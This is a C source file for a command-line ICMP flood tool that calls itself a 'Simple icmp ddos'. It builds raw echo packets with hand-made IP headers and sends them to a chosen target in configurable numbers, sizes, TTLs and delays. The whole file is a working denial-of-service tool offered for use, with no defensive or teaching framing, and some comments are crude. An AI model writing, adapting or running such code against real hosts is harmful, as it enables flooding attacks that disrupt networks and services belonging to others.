/*
 * icmpflood.c - Simple icmp ddos,
 * uses echo packets.
 *   Сделано от души 2023.
 *
 * Copyright (c) [2023] [oldteam & lomaster]
 * SPDX-License-Identifier: BSD-3-Clause
*/

#include <stdio.h>
#include <getopt.h>
#include <time.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>

#define VERSION "0.1"
#define ICMP_TYPE 8 /*IMCP_ECHO*/
#define ICMP_CODE 0 /*Default*/

const char* short_opts = "hvT:";
const struct option long_opts[] =
{
  {"help", no_argument, 0, 'h'},
  {"verbose", no_argument, 0, 'v'},
  {"count", required_argument, 0, 1},
  {"size", required_argument, 0, 2},
  {"ttl", required_argument, 0, 3},
  {"delay", required_argument, 0, 4},
};

struct /*Для хранения настроек.*/
program_options
{
  int delay_ms;
  int verbose;
  int packets_count;
  int packet_size;
  int ip_ttl;
};

int check_root(void);
void usage(void);
char* dns_to_ip(char*);
int get_local_ip(char* buffer);
uint16_t checksum_16bit(const uint16_t* data, int length);
void delay(int milliseconds);

void
send_icmp_package(int fd, const char* dest_ip,
  int packet_size, int packets_count,
  int verbose, int delay_ms, int ttl);

char* run;

int main(int argc, char** argv)
{
  char* node;
  run = argv[0];

  struct program_options pmo =
  {
    0,
    0,
    3000,
    1000,
    64,
  };
  if (argc <= 1){usage(); return 0;}

  int rez, option_index = 0;
  while ((rez = getopt_long_only(argc, argv, short_opts, long_opts, &option_index)) != -1){
    switch (rez) {
      case 'h':
        usage();
        return 0;
      case 'v':
        pmo.verbose = 1;
        break;
      case 1:
        pmo.packets_count = atoi(optarg);
        break;
      case 2:
        pmo.packet_size = atoi(optarg);
        break;
      case 3:
        pmo.ip_ttl = atoi(optarg);
        break;
      case 4:
        pmo.delay_ms = atoi(optarg);
        break;
      case '?':
      default:
        usage();
        return 0;
    }
  }

  time_t now = time(NULL);
  struct tm *t = localtime(&now); char datetime[20];
  strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", t);
  printf("Starting ICMP-Flood %s at %s\n", VERSION, datetime);

  if (check_root() == -1) {
    printf("ERROR: Only (sudo) run. Fucking RAW sockets.\n");
    return 1;
  }
  if (optind < argc) {
    node = argv[optind];
  }

  node = dns_to_ip(node);
  if (node != NULL){
    printf("INFO: Target IP is: %s\n", node);
  }
  else {
    printf("ERROR: dns_to_ip() failed resolve dns.\n");
    return 1;
  }

  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sock == -1){
    return EOF;
  }

  int one = 1;
  const int *val = &one;
  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) == -1) {
    return 1;
  }
  int on = 1;
  if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) {
    return (0);
  }

  send_icmp_package(sock, node, pmo.packet_size, pmo.packets_count, pmo.verbose, pmo.delay_ms, pmo.ip_ttl);
  return 0;
}

int check_root(void)
{
  if (geteuid() == 0) {
    return 0; /*пользователь root*/
  }
  else {
    return -1; /*пользователь не root*/
  }
}

void usage(void)
{
  printf("usage: %s [target] [flags]\n\n", run);

  puts("arguments program:");
  puts("  -h, -help             Show this help message and exit.");
  puts("  -v, -verbose          On verbose mode.\n");

  puts("arguments main:");
  puts("  -delay <ms>           Edit delay before send.");
  puts("  -count <count>        Set count send packets.");
  puts("  -size <byte>          Set size send packets.");
  puts("  -ttl <count>          Set TTL on IP header.\n");

  puts("Created by lomaster & OldTeam");
}

char* dns_to_ip(char* dns)
{
  struct hostent *he;
  struct in_addr **addr_list;
  int i;

  if ((he = gethostbyname(dns)) == NULL){
    return NULL;
  }
  addr_list = (struct in_addr**)he->h_addr_list;
  for (i = 0; addr_list[i] != NULL; i++){
    return inet_ntoa(*addr_list[i]) ;
  }

  return NULL;
}

int get_local_ip(char* buffer)
{
  struct sockaddr_in serv, name;
  const char* kGoogleDnsIp = "8.8.8.8";
  int dns_port = 53, err __attribute__((unused));
  socklen_t namelen;
  int sock;

  sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock == -1){
    return EOF;
  }

  memset(&serv, 0, sizeof(serv));
  serv.sin_family = AF_INET;
  serv.sin_addr.s_addr = inet_addr(kGoogleDnsIp);
  serv.sin_port = htons( dns_port );

  err = connect(sock, (const struct sockaddr*)&serv, sizeof(serv));

  namelen = sizeof(name);
  err = getsockname(sock, (struct sockaddr*)&name, &namelen);

  inet_ntop(AF_INET, &name.sin_addr, buffer, 100);

  close(sock);
  return 0;
}

uint16_t checksum_16bit(const uint16_t* data, int length)
{
  uint32_t sum = 0;
  while (length > 1) {
    sum += *data++;
    length -= 2;
  }
  if (length == 1){
    sum += *((uint8_t*)data);
  }

  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  return (uint16_t)~sum;
}

void send_icmp_package(int fd, const char* dest_ip,
  int packet_size, int packets_count,
  int verbose, int delay_ms, int ttl)
{
  char *packet;
  int pktsize = sizeof (struct iphdr) + sizeof (struct icmphdr) + packet_size;
  packet =(char*)malloc(pktsize);
  struct iphdr *iph = (struct iphdr *) packet;
  struct icmphdr *icmph = (struct icmphdr *) (packet + sizeof (struct iphdr));
  struct sockaddr_in dest;
  char source_ip[20];
  int success_packets = 0;

  if (ttl > 255){
    printf("ERROR: Failed set TTL, max (255).\n");
    abort();
  }

  memset (packet, 0, pktsize);

  dest.sin_family = AF_INET;
  dest.sin_port = htons(0);
  dest.sin_addr.s_addr = inet_addr(dest_ip);

  iph->version = 4;
  iph->tot_len = pktsize;
  iph->ihl= 5;
  iph->tos = 0;
  iph->id = htons(0);
  iph->ttl = ttl;
  iph->frag_off = IP_DF;
  iph->protocol = IPPROTO_ICMP;

  get_local_ip(source_ip);
  printf("INFO: Source IP is: %s\n", source_ip);

  iph->saddr = inet_addr(source_ip);
  iph->daddr = dest.sin_addr.s_addr;
  iph->check = 0;

  /*
   * Не обязательно, да и нахрен не надо тут :)
   * int checksum_ip_header = checksum_16bit((unsigned short*)packet, iph->tot_len >> 1);
   * iph->check = checksum_ip_header;
  */

  icmph->type = ICMP_TYPE;
  icmph->code = ICMP_CODE;
  icmph->un.echo.sequence = rand();
  icmph->un.echo.id = getpid()*4+rand();

  printf("\n");
  clock_t start_time = clock();

  if (packet_size > 1500) {
    printf("WARNING: You specified a size greater than 1500, most likely the packages just won't arrive!\n");
  }

  for (int i = 0; i < packets_count; i++) {
    delay(delay_ms);
    memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, packet_size);

    icmph->checksum = 0;
    icmph->checksum = checksum_16bit((unsigned short*)packet, sizeof(struct icmphdr)+ packet_size);

    if (verbose == 1){printf("[SENDTO]:%s >> %s:0 [ & ] size: %d [ & ] ttl: %d\n", source_ip, dest_ip, iph->tot_len, iph->ttl);fflush(stdout);}

    ssize_t send = sendto(fd, packet, packet_size, 0, (struct sockaddr*)&dest, sizeof(dest));
    if (send == -1){
      if (verbose == 1){printf("^ FAILED & SENDTO: %s >> %s:0\n", source_ip, dest_ip);fflush(stdout);}
    }
    else {
      success_packets++;
    }

    float progress = (float)i/ packets_count * 100.0;

    if ((i + 1) % 1000 == 0) {
      printf("[%.f%%] sent %d packets\n", progress, i + 1);
      fflush(stdout);
    }
  }
  printf("\nINFO: Free %d RAM.", packet_size);

  free(packet);
  clock_t end_time = clock();

  double execution_time_ms = (double)(end_time - start_time) / CLOCKS_PER_SEC * 1000.0;
  printf("\nEnding ICMP-Flood %d (success) packets at %dms\n", success_packets, (int)execution_time_ms);
}

void delay(int milliseconds)
{
  struct timespec ts;
  ts.tv_sec = milliseconds / 1000;
  ts.tv_nsec = (milliseconds % 1000) * 1000000;
  nanosleep(&ts, NULL);
}
